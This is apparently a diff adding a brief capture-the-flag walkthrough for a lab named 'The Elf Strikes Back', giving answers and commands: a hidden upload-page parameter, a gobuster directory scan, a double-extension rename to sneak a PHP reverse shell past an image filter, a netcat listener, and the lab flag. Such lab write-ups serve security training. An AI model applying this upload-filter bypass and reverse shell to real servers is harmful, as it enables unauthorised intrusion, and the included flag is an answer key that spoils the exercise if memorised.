@@ -1,0 +1,28 @@
+
+							The Elf Strikes Back! 
+						-------------------------------------
+
+1. What string of text needs adding to the URL to get access to the upload page?
+ans: /?id=ODIzODI5MTNiYmYw
+solution: your machine ip/?id=ODIzODI5MTNiYmYw
+
+2. What type of file is accepted by the site?
+ans: images
+solution: see source code of the page and you get all image extentions
+
+3. Bypass the filter and upload a reverse shell.In which directory are the uploaded files stored?
+ans: /uploads
+command: gobuster dir -u 10.10.105.229 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+         -o Day_2_The_Elf_Strikes_Back.txt
+ 
+4. Activate your reverse shell and catch it in a netcat listener!
+ans: auto-complete
+command: mv php_main_reverse_shell.php php_main_reverse_shell.jpg.php (means rename file "double extention vulnerability")
+command: nc -nvlp 1234 (this is my port)
+solution: goto browser machine ip/uploads
+solution: click on your uploaded file
+solution: goto your netcat terminal
+
+5. What is the flag in /var/www/flag.txt?
+ans: THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh} 
+command: cat /var/www/flag.txt
